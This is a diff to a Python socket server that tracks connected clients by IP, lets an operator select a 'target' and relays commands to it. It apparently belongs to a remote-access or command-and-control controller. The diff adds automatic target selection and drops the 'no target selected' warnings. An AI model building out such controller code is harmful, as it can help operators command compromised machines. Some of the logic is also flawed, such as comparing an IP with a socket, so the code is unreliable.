@@ -57,6 +57,13 @@ def handle_client(client_socket, client_address):
     clients[client_address[0]] = client_socket
     print(f"[+] Client connected: {client_address[0]}")
     client_connected.set()
+    
+    if len(clients) == 1:
+        selected_client = client_socket
+        print(f"[+] Automatically selected client: {client_address[0]}")
+    elif len(clients) > 1:
+        print("[+] More than one client connected. No automatic selection.")
+    
     while True:
         try:
             message = client_socket.recv(1024).decode()
@@ -84,18 +91,16 @@ def handle_client(client_socket, client_address):
                     print(f"[-] Target not found: {target_ip}")
             elif message.startswith("!remove target"):
                 _, target_ip = message.split(" ")
-                if target_ip in clients:
+                if target_ip in clients and selected_client == clients[target_ip]:
                     selected_client = None
                     print(f"[+] Target removed: {target_ip}")
-                else:
+                elif target_ip not in clients:
                     print(f"[-] Target not found: {target_ip}")
             elif message == "!list":
                 for ip in clients:
                     print(ip + (" (selected)" if ip == selected_client else ""))
             elif selected_client:
                 selected_client.send(message.encode())
-            else:
-                print("[-] No target selected.")
         except Exception as e:
             print(f"[-] Error: {e}")
             break
@@ -123,8 +128,6 @@ def prompt():
         elif command.startswith("!"):
             if selected_client:
                 selected_client.send(command.encode())
-            else:
-                print("[-] No target selected.")
         else:
             print("[-] Invalid command")
 
